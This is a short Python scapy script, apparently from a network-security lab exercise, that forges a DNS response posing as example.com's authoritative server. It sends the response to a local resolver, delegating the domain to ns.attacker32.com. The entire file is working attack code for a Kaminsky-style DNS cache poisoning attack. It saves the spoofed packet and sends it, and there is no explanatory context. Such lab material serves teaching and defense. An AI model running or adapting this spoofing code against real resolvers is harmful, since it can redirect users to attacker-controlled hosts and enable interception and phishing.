from scapy.all import *

name = 'twysw.example.com'
domain = 'example.com'

# reply packet from target domain server to local server
ip_packet = IP(src='199.43.133.53', dst='10.9.0.53', chksum=0)
udp_packet = UDP(sport=53, dport=33333, chksum=0)

qd_sec  = DNSQR(qname=name)
ans_sec = DNSRR(rrname=name, type='A',
                 rdata='10.10.10.10', ttl=259200)
ns_sec  = DNSRR(rrname=domain, type='NS',
               rdata='ns.attacker32.com', ttl=259200)

dns_packet = DNS(id=0xAAAA, aa=1,ra=0, rd=0, cd=0, qr=1,
             qdcount=1, ancount=1, nscount=1, arcount=0,
             qd=qd_sec, an=ans_sec, ns=ns_sec)
reply_packet = ip_packet/udp_packet/dns_packet
with open('dns_response.bin', 'wb') as f:
  f.write(bytes(reply_packet))
  reply_packet.show()
   
send(reply_packet)

